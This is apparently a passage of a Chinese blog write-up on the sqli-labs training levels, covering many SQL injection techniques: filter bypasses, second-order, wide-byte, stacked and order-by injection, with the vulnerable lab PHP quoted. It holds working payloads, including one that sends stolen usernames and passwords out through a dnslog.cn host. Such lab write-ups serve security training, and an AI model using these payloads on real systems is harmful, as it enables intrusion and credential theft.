+<h3 id="referer注入"><a href="#referer注入" class="headerlink" title="referer注入"></a>referer注入</h3><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><h3 id="base64加密的cookie注入"><a href="#base64加密的cookie注入" class="headerlink" title="base64加密的cookie注入"></a>base64加密的cookie注入</h3><p>将payload经base64加密后上传即可</p>
+<h1 id="过滤注释的GET"><a href="#过滤注释的GET" class="headerlink" title="==过滤注释的GET=="></a>==过滤注释的GET==</h1><p>源码中过滤掉了注释符<br>注释符不能用了所以要在闭合上下功夫</p>
+<pre><code class="php">?id=&#39; union select 1,group_concat(username),group_concat(password) from users where 1 or &#39;1&#39; = &#39;1
+?id=-1&#39; union select 1,(select group_concat(username) from users),&#39;3
+</code></pre>
+<p>在末尾构造语句使闭合符号与语句组成一个不影响的语句<br>闭合方式多种多样</p>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="==二次注入=="></a>==二次注入==</h1><p>首先注册一个用户admin‘#<br>然后登录<br>修改密码<br>当你修改密码时 后台就执行了</p>
+<pre><code class="sql">UPDATE users SET passwd=&quot;新密码&quot; WHERE username =&#39; admin&#39; # &#39; AND password=&#39;
+</code></pre>
+<p>也就是<br>你用admin’#用户把admin用户的密码给改了</p>
+<h1 id="过滤"><a href="#过滤" class="headerlink" title="==过滤=="></a>==过滤==</h1><h2 id="过滤-or-和-and"><a href="#过滤-or-和-and" class="headerlink" title="过滤 or 和 and"></a>过滤 or 和 and</h2><p>将payload里所有 and 和or<br>替换为 anandd 和 oorr<br>这里password也要变成passwoorrd</p>
+<pre><code class="php">?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from users#
+</code></pre>
+<h2 id="过滤下的报错注入"><a href="#过滤下的报错注入" class="headerlink" title="过滤下的报错注入"></a>过滤下的报错注入</h2><h3 id="26"><a href="#26" class="headerlink" title="26"></a>26</h3><pre><code class="php">$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            /strip out OR (non case sensitive)
+    $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);        /Strip out AND (non case sensitive)
+    $id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        /strip out */
+    $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        /Strip out --
+    $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            /Strip out #
+    $id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);        /Strip out spaces
+    $id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);        /Strip out slashes
+    return $id;
+</code></pre>
+<p>要用到||代替or information里的or要双写，用||‘1’=‘1来闭合</p>
+<pre><code class="php">?id=0&#39;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),1)||&#39;1&#39;=&#39;1
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/41bb72de0481416fa30c710fad9b1959.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="27"><a href="#27" class="headerlink" title="27"></a>27</h3><p><img src="https://img-blog.csdnimg.cn/73dc47cc35d046f39f35db64fba9fca9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<pre><code class="php">?id=0&#39;||updatexml(1,concat(0x7e,(SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;security&#39;))),1)||&#39;1&#39;=&#39;1
+</code></pre>
+<p>大小写select和union</p>
+<h2 id="过滤下的时间盲注"><a href="#过滤下的时间盲注" class="headerlink" title="过滤下的时间盲注"></a>过滤下的时间盲注</h2><p>26到27关的a都是无法报错注入的<br>能用时间盲注过滤方法和不带a的关一样</p>
+<h1 id="waf"><a href="#waf" class="headerlink" title="==waf=="></a>==waf==</h1><pre><code class="php">/ take the variables 
+if(isset($_GET[&#39;id&#39;])){
+    $qs = $_SERVER[&#39;QUERY_STRING&#39;];
+    $hint=$qs;
+    $id1=java_implimentation($qs);
+    $id=$_GET[&#39;id&#39;];
+    //echo $id1;
+    whitelist($id1);}
+
+/WAF implimentation with a whitelist approach..... only allows input to be Numeric.
+function whitelist($input){
+    $match = preg_match(&quot;/^\d+$/&quot;, $input);
+    if($match)
+        {//echo &quot;you are good&quot;;
+            //return $match;
+            }
+    else
+        {header(&#39;Location: hacked.php&#39;);
+            //echo &quot;you are bad&quot;;
+            }
+}
+/ The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).
+function java_implimentation($query_string){
+    $q_s = $query_string;
+    $qs_array= explode(&quot;&amp;&quot;,$q_s);
+    foreach($qs_array as $key =&gt; $value){
+        $val=substr($value,0,2);
+        if($val==&quot;id&quot;){
+            $id_value=substr($value,3,30); 
+            return $id_value;
+            echo &quot;&lt;br&gt;&quot;;
+            break;}
+        }
+}
+</code></pre>
+<p>java_implimentation模拟 tomcat 的查询函数处理<br>whitelist白名单过滤 检测到不符合规则就重定向<br>漏洞是whitelist只检测了java_implimentation输出的第一个参数$id_value<br>后面的逃过检测 注入点在后面<br><img src="https://img-blog.csdnimg.cn/cb26a817890f43dea574e56898b28098.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="==宽字节注入=="></a>==宽字节注入==</h1><p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。<br>urlencode(’) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。<br><img src="https://img-blog.csdnimg.cn/b1928e9bf27a4e4aaae0531adb797366.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="结束注释"><a href="#结束注释" class="headerlink" title="==结束注释=="></a>==结束注释==</h2><p>当转译为‘/时可用’/**/来==结束注释==</p>
+<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="==堆叠注入=="></a>==堆叠注入==</h1><p>在SQL中，分号（;）是用来表示一条sql语句的结束。结束一个sql语句后继续构造下一条语句，会一起执行 因此产生了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间区别在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句<br>堆叠注入为攻击者提供了很多的攻击手段，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的。这种技术在SQL注入中还是比较频繁的。<br>如下展示了堆叠注入插入了一个用户数据</p>
+<p><img src="https://img-blog.csdnimg.cn/382b3c83943547868cbe1452eb266b25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/ba1f6818754e470bb14c6e4bbacded8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述">同时也可以进行dnslog注入</p>
+<pre><code class="php">?id=1&#39;;select load_file(concat(&#39;//&#39;,(select hex(concat_ws(&#39;~&#39;,username,password)) from users limit 0,1),&#39;.au0mvd.dnslog.cn/1.txt&#39;));--+
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/9b01f339db4641799cd67780c58d458e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
+<pre><code class="css">desc查看表结构的详细信息
+desc table_name;
+此处desc是describe的缩写，用法: desc 表名/查询语句
+</code></pre>
+<p>handler适用于select等过滤</p>
+<pre><code class="sql">handler handler_table open;
+handler handler_table read first;
+handler handler_table read next;
+……
+handler handler_table close;
+</code></pre>
+<h1 id="二次注入进阶"><a href="#二次注入进阶" class="headerlink" title="二次注入进阶"></a>二次注入进阶</h1><h2 id="需成功登录才能二次注入"><a href="#需成功登录才能二次注入" class="headerlink" title="需成功登录才能二次注入"></a>需成功登录才能二次注入</h2><pre><code class="php">function sqllogin($host,$dbuser,$dbpass, $dbname){
+   // connectivity
+//mysql connections for stacked query examples.
+$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);
+
+   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);
+   $password = $_POST[&quot;login_password&quot;];
+
+   // Check connection
+   if (mysqli_connect_errno($con1))
+   {
+       echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();
+   }
+   else
+   {
+       @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database ######: &quot;);
+   }
+ /* execute multi query */
+     $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;
+   if (@mysqli_multi_query($con1, $sql))
+   {
+        /* store first result set */
+      if($result = @mysqli_store_result($con1))
+      {
+     if($row = @mysqli_fetch_row($result)){
+        if ($row[1]) {
+           return $row[1];
+        }
+        else{
+           return 0;
+        }
+     }
+      }
+
+      else  {
+    echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;;
+    print_r(mysqli_error($con1));
+    echo &quot;&lt;/font&gt;&quot;;  
+      }
+   }
+   else 
+   {
+    echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;;
+    print_r(mysqli_error($con1));
+    echo &quot;&lt;/font&gt;&quot;;  
+    }
+</code></pre>
+<p>这里对username和password过滤不强<br>可通过万能密码</p>
+<pre><code class="php"> 1’ or &#39;1&#39;=&#39;1
+</code></pre>
+<p> 登录<br> 接下来通过修改密码界面二次注入</p>
+<pre><code class="php"> &lt;?PHP
+session_start();
+if (!isset($_COOKIE[&quot;Auth&quot;])){
+    if (!isset($_SESSION[&quot;username&quot;])) {
+           header(&#39;Location: index.php&#39;);
+    }
+    header(&#39;Location: index.php&#39;);
+}
+?&gt;
+&lt;?php
+//including the Mysql connect parameters.
+include(&quot;../sql-connections/sql-connect.php&quot;);
+if (isset($_POST[&#39;submit&#39;])){
+    # Validating the user input........
+    $username= $_SESSION[&quot;username&quot;];
+    $curr_pass= mysql_real_escape_string($_POST[&#39;current_password&#39;]);//原密码 还是万能密码绕过
+    $pass= mysql_real_escape_string($_POST[&#39;password&#39;]);//新密码
+    $re_pass= mysql_real_escape_string($_POST[&#39;re_password&#39;]);
+    if($pass==$re_pass){    
+        $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;
+        $res = mysql_query($sql) or die(&#39;You tried to be smart, Try harder!!!! :( &#39;);
+        $row = mysql_affected_rows();
+        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;
+        echo &#39;&lt;center&gt;&#39;;
+        if($row==1){
+            //echo &quot;Password successfully updated&quot;;
+            echo &#39;&lt;img src=&quot;../images/password-updated.jpg&quot;&gt;&#39;;
+            }
+        else{
+            header(&#39;Location: failed.php&#39;);
+            //echo &#39;You tried to be smart, Try harder!!!! :( &#39;;
+
+        }
+    }
+    else{
+        echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#39;;
+        echo &quot;Make sure New Password and Retype Password fields have same value&quot;;
+        header(&#39;refresh:2, url=index.php&#39;);
+    }
+}
+?&gt;
+&lt;?php
+if(isset($_POST[&#39;submit1&#39;]))
+{
+    session_destroy();
+    setcookie(&#39;Auth&#39;, 1 , time()-3600);
+    header (&#39;Location: index.php&#39;);
+}
+?&gt;
+</code></pre>
+<p>他用户名通过session获取，所以无法更改其他用户</p>
+<h1 id="order-by注入"><a href="#order-by注入" class="headerlink" title="==order by注入=="></a>==order by注入==</h1><pre><code class="sql">SELECT * FROM users ORDER BY 
+</code></pre>
+<p>order by 与where差不多<br>但不同是order by不能使用union联合<br>其他都可 也比较灵活<br>从46到53关皆为order by注入</p>
+<h1 id="限制次数的注入"><a href="#限制次数的注入" class="headerlink" title="限制次数的注入"></a>限制次数的注入</h1><p>从54关开始，限制了注入次数<br>一旦超过次数就会改变数据<br>一切又要重新开始<br><img src="https://img-blog.csdnimg.cn/f9b1e0f39b0347c28528953eed71b19b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3d5876f7879045899ce8af31d082f9b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/17eb5837dcf14d76bcd6f276ebccd83c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/1eda68e6677d43eca8c14b97cffbc769.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述">58-62可以报错注入<br>从62关开始只能使用盲注<br>==id注入部分代码==</p>
+<pre><code class="php">&lt;?php
+id注入部分代码
+//including the Mysql connect parameters.
+include &#39;../sql-connections/sql-connect-1.php&#39;;
+include &#39;../sql-connections/functions.php&#39;;
+error_reporting(0);
+$pag = $_SERVER[&#39;PHP_SELF&#39;]; /generating page address to piggy back after redirects...
+$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; /characterset for generating random data
+$times= 10;
+$table = table_name();
+$col = column_name(1);     / session id column name
+$col1 = column_name(2);   /secret key column name
+/ Submitting the final answer
+if(!isset($_POST[&#39;answer_key&#39;])){
+    / resetting the challenge and repopulating the table .
+    if(isset($_POST[&#39;reset&#39;])){
+        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);
+        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;
+        echo &quot;Redirecting you to main challenge page..........\n&quot;;
+        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );
+        //echo &quot;cookie expired&quot;;
+
+    }
+    else{
+        / Checking the cookie on the page and populate the table with random value.
+        if(isset($_COOKIE[&#39;challenge&#39;])){
+            $sessid=$_COOKIE[&#39;challenge&#39;];
+            //echo &quot;Cookie value: &quot;.$sessid;
+        }
+        else{
+            $expire = time()+60*60*24*30;
+            $hash = data($table,$col);
+            setcookie(&quot;challenge&quot;, $hash, $expire);
+
+        }
+
+        echo &quot;&lt;br&gt;\n&quot;;
+        /take the variables
+        if(isset($_GET[&#39;id&#39;])){
+            $id=$_GET[&#39;id&#39;];
+            /logging the connection parameters to a file for analysis.
+            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
+            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
+            fclose($fp);
+            /update the counter in database
+            next_tryy();
+            /Display attempts on screen.
+            $tryyy = view_attempts();
+            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;
+            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;
+          /Reset the Database if you exceed allowed attempts.
+            if($tryyy &gt;= ($times+1)){
+                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);
+                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;
+                echo &quot;Redirecting you to challenge page..........\n&quot;;
+                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );
+                echo &quot;&lt;br&gt;\n&quot;;
+            }    
+        / Querry DB to get the correct output
+            $sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+            $result=mysql_query($sql);
+            $row = mysql_fetch_array($result);
+            if($row){
+                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;    
+                echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
+                echo &quot;&lt;br&gt;&quot;;
+                echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
+                echo &quot;&lt;/font&gt;&quot;;
+            }
+            else {
+                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
+//                print_r(mysql_error());
+                echo &quot;&lt;/font&gt;&quot;;  
+            }
+        }
+        else{
+            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;
+            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;
+            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;
+        }
+    }
+}
+</code></pre>
+<p>==答案提交部分==</p>
+<pre><code class="php">else
+{
+    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;
+    $key = addslashes($_POST[&#39;key&#39;]);
+    $key = mysql_real_escape_string($key);
+    //echo $key;
+    /Query table to verify your result
+    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;
+    //echo &quot;$sql&quot;;
+    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());
+    $row = mysql_fetch_array($result);
+    if($row)
+    {
+        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
+        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
+        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;
+        echo &quot;&lt;/font&gt;&quot;; 
+        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );    
+    }
+    else {
+        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
+        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
+        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;
+        header( &quot;refresh:3;url=index.php&quot; );
+        //print_r(mysql_error());
+        echo &quot;&lt;/font&gt;&quot;;  
+        }    
+}
+?&gt;
+</code></pre>
+<p>@<a href="目录">TOC</a></p>
+
+        </div>
+
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0undefined"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0undefined"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent">
+        </div>
+        <!-- 评分 -->
+        <div class="single-reward">
+          
+        </div>
+        <!-- 自定义署名方式 -->
+        <footer class="post-footer">
+          <div class="post-lincenses" style="color: #ff9966;">
+            欢迎转载，转载时请注明来源哦！
+            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" style="color: #ff9966;" target="_blank"
+              rel="nofollow">
+              <i class="fa fa-creative-commons" aria-hidden="true"></i>ncsa4.0</a>
+          </div>
+          
+          <div class="post-tags" style="color: #a39391">
+            <span><i class="fa fa-tags"></i>
+              
+              <a href="/tags/web/" style="color: #716e77;">web<em>·</em></a>
+              
+              <a href="/tags/sql/" style="color: #716e77;">sql<em>·</em></a>
+              
+              <a href="/tags/sqli-lab/" style="color: #716e77;">sqli-lab<em>·</em></a>
+              
+            </span>
+            <span>
+              <i class="iconfont icon-file"></i>
+              
+              <a href="/categories/ctf/" style="color: #716e77;">ctf</a>
+              
+            </span>
+          </div>
+          
+          <div class="post-share" >
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+        <!-- <div class="tag-cloud">
+          <div class="tag-cloud-title">
+          </div>
+          <div class="tag-cloud-tags">
+            <a href="/tags/SSTI/" style="font-size: 10px; color: #f06966">SSTI</a> <a href="/tags/buuctf/" style="font-size: 10px; color: #f06966">buuctf</a> <a href="/tags/ctfhub/" style="font-size: 15px; color: #9592a7">ctfhub</a> <a href="/tags/docker/" style="font-size: 10px; color: #f06966">docker</a> <a href="/tags/git/" style="font-size: 10px; color: #f06966">git</a> <a href="/tags/json-web-token/" style="font-size: 10px; color: #f06966">json web token</a> <a href="/tags/jwt/" style="font-size: 10px; color: #f06966">jwt</a> <a href="/tags/kali/" style="font-size: 10px; color: #f06966">kali</a> <a href="/tags/linux/" style="font-size: 10px; color: #f06966">linux</a> <a href="/tags/rce/" style="font-size: 10px; color: #f06966">rce</a> <a href="/tags/sql/" style="font-size: 10px; color: #f06966">sql</a> <a href="/tags/sqli-lab/" style="font-size: 10px; color: #f06966">sqli-lab</a> <a href="/tags/ssh/" style="font-size: 10px; color: #f06966">ssh</a> <a href="/tags/upload/" style="font-size: 10px; color: #f06966">upload</a> <a href="/tags/upload-labs/" style="font-size: 10px; color: #f06966">upload-labs</a> <a href="/tags/visual-studio-2022/" style="font-size: 10px; color: #f06966">visual studio 2022</a> <a href="/tags/web/" style="font-size: 20px; color: #39bae8">web</a> <a href="/tags/xss/" style="font-size: 10px; color: #f06966">xss</a> <a href="/tags/xss-lab/" style="font-size: 10px; color: #f06966">xss-lab</a> <a href="/tags/xxe/" style="font-size: 10px; color: #f06966">xxe</a> <a href="/tags/动态加载/" style="font-size: 10px; color: #f06966">动态加载</a> <a href="/tags/悦读/" style="font-size: 10px; color: #f06966">悦读</a> <a href="/tags/提权/" style="font-size: 10px; color: #f06966">提权</a> <a href="/tags/模板注入/" style="font-size: 10px; color: #f06966">模板注入</a>
+          </div>
+        </div> -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+        <div class="post-nepre half previous">
+          
+            <a href="/2022/08/SSTI模板注入/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/cungudafa/cdn/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://gcore.jsdelivr.net/npm/ushio-api-img-moe@5.0.85/img_854_2000x1125_600_null_normal.jpg"
+                  style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)"
+                  src="https://gcore.jsdelivr.net/npm/ushio-api-img-moe@5.0.85/img_854_2000x1125_600_null_normal.jpg">
+              </div>
+              <span class="label">Previous Post</span>
+              <div class="info">
+                <h3>SSTI模板注入</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+          
+          
+          
+          <div class="post-nepre half next">
+            
+              <a href="/2022/08/linux动态加载/" rel="next">
+                <div class="background">
+                  <img class="lazyload" src="https://cdn.jsdelivr.net/gh/cungudafa/cdn/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://gcore.jsdelivr.net/npm/ushio-api-img-moe@5.0.85/img_854_2000x1125_600_null_normal.jpg"
+                    style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;"
+                    onerror="imgError(this,3)" src="https://gcore.jsdelivr.net/npm/ushio-api-img-moe@5.0.85/img_854_2000x1125_600_null_normal.jpg">
+                </div>
+                <span class="label">Next Post</span>
+                <div class="info">
+                  <h3>linux动态加载</h3>
+                  <hr>
+                </div>
+              </a>
+            </div>
+            
+      </section>
+      <!-- 加密文章隐藏评论 -->
+      <section class="comment" >
+        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<div id="gitalk-container" class="comment"></div> 
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="/js/md5.min.js"></script>
+<script type="text/javascript">
+	var gitalk = new Gitalk({
+  	clientID: '',
+  	clientSecret: '',
+  	repo: 'cungudafa.github.io',
+  	owner: 'cungudafa',
+	admin: ['cungudafa'],
+	distractionFreeMode: 'true',
+    id: md5(location.pathname)
+})
+gitalk.render('gitalk-container') 
+</script>
+
+      </section>
+      <!-- 加密文章隐藏作者信息 -->
+      
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+<!--评论配置-->
+
+
+
+      <!-- body.end -->
+    </div>
+    <!-- search -->    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- footer-->    
+    
+    <footer id="colophon" class="site-footer" role="contentinfo">
+    <div class="site-info">
+        <div class="footertext">
+          <div class="img-preload">
+              <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+              <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+          </div>
+        </div>
+        <!-- 网站数据统计 -->
+        <div class="footer-device">
+          <p style="font-family: 'Ubuntu', sans-serif;">
+            <span style="color: #ff9999;padding-left: 20px;">
+                <!-- 网站运行时间统计 -->
+                <i class="fa fa-clock-o" aria-hidden="true"></i>
+                <span id="time" align="center">载入时间中...</span>
+                <script>
+                var now = new Date(); 
+                function createtime() { 
+                      var grt= new Date("Sun Aug 28 2022 01:20:00 GMT+0800 (GMT+08:00)");//在此处修改你的建站时间
+                      now.setTime(now.getTime()+250); 
+                      days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+                      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+                      if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+                      mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+                      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+                      snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+                      document.getElementById("time").innerHTML = "小破站在各种灾难中苟活了 "+ dnum +" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";      
+                  } 
+                  setInterval("createtime()",250);
+                </script>
+            </span> 
+          </p>
+        </div>
+        <div class="footer-device">
+          <p style="font-family: 'Ubuntu', sans-serif;">
+            <span style="color: #b9b9b9;padding-left: 20px;">
+              <!-- 全网站字数统计wordcount -->
+              
+              <!-- 不蒜子网页计数器 -->
+              
+              <span style="padding-left: 20px;"><i class="fa fa-fire" aria-hidden="true" style="color: #ff9999;display:inline-block"></i><span id="busuanzi_container_site_pv">总访问量： <span id="busuanzi_value_site_pv" style="color:#ff9999;"></span>次</span>
+              </span>
+              
+              
+              <span style="padding-left: 20px;"><i class="fa fa-user" aria-hidden="true" style="color: #ff9999;display:inline-block"></i><span id="busuanzi_container_site_uv">总访问人数： <span id="busuanzi_value_site_uv" style="color:#ff9999;"></span>人</span>
+              </span>
+              
+            </span>
+          </p>
+        </div>
+        <!-- 作者注明 -->
+        <div class="footer-device">
+          <p style="font-family: 'Ubuntu', sans-serif;">
+              <span style="color: #b9b9b9;">
+                Copyright &copy; 2022
+                &nbsp;<a style="color: #ff9999;display:inline-block"> s1rius </a>
+                &nbsp;<i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> 
+                &nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank" style="color: #ff9999;display:inline-block">Hexo</a>
+                |&nbsp;Theme&nbsp;<a href="https://gitee.com/cungudafa/hexo-theme-sakuraplus" target="_blank" style="color: #ff9999;display:inline-block">SakuraPlus</a>
+              </span>
+          </p>
+        </div>
+         <!-- 网站作者版权注明 -->
+         
+          <div id="footer-info" class="inner">
+            <p style="font-family: 'Ubuntu', sans-serif;">
+              <span style="color: #ff9999;">
+                
+              </span>
+            </p>
